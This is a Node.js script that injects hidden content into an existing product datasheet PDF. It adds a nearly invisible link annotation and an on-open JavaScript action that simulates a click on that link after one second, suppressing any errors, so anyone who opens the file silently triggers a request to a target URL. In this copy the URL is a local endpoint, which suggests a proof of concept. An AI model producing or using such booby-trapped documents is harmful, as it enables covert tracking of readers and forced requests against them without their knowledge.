const { PDFDocument, PDFName, PDFArray } = require('pdf-lib');
const fs = require('fs');

async function injectPDF() {
  // Load the PDF document
  const existingPdfBytes = fs.readFileSync('11391xxx_DALI_PushDim-B.pdf');

  // Load a PDFDocument from the existing PDF bytes
  const pdfDoc = await PDFDocument.load(existingPdfBytes);

  // Define the target URL
  const targetUrl = 'http://127.0.0.1:5000/Apidoc';

  // Get the first page of the document
  const pages = pdfDoc.getPages();
  const firstPage = pages[0];

  const { width, height } = firstPage.getSize();
  const annotWidth = 0.1;  // Small annotation size to make it nearly invisible
  const annotHeight = 0.1;
  const xPos = 0;  // Position it at the corner
  const yPos = 0;

  // Create a link annotation (nearly invisible)
  const linkAnnotation = pdfDoc.context.obj({
    Type: 'Annot',
    Subtype: 'Link',
    Rect: [xPos, yPos, xPos + annotWidth, yPos + annotHeight],
    Border: [0, 0, 0],
    A: {
      Type: 'Action',
      S: 'URI',
      URI: pdfDoc.context.obj(targetUrl),
    },
  });

  // Add the annotation to the page
  let existingAnnots = firstPage.node.get(PDFName.of('Annots'));
  if (!existingAnnots) {
    existingAnnots = pdfDoc.context.obj([]);
    firstPage.node.set(PDFName.of('Annots'), existingAnnots);
  }
  existingAnnots.push(linkAnnotation);

  // Embed JavaScript to trigger the hidden link click
  const jsScript = `
    app.setTimeOut(function() {
      try {
        var annots = this.getAnnots({ nPage: 0 });
        if (annots && annots.length > 0) {
          var rect = annots[0].rect;
          this.rect = rect;
          this.mouseDown({ nPage: 0, x: rect[0], y: rect[1] });
          this.mouseUp({ nPage: 0, x: rect[0], y: rect[1] });
        }
      } catch (e) {
        // Handle errors silently
      }
    }, 1000);
  `;

  // Embed the JavaScript into the PDF
  const jsAction = pdfDoc.context.obj({
    Type: 'Action',
    S: 'JavaScript',
    JS: pdfDoc.context.obj(jsScript),
  });

  // Set the OpenAction for the document
  const catalog = pdfDoc.catalog;
  catalog.set(PDFName.of('OpenAction'), jsAction);

  // Save the modified PDF
  const pdfBytes = await pdfDoc.save();
  fs.writeFileSync('injected_new.pdf', pdfBytes);

  console.log('Injected hidden JavaScript and annotation into PDF successfully.');
}

// Run the injection function
injectPDF();
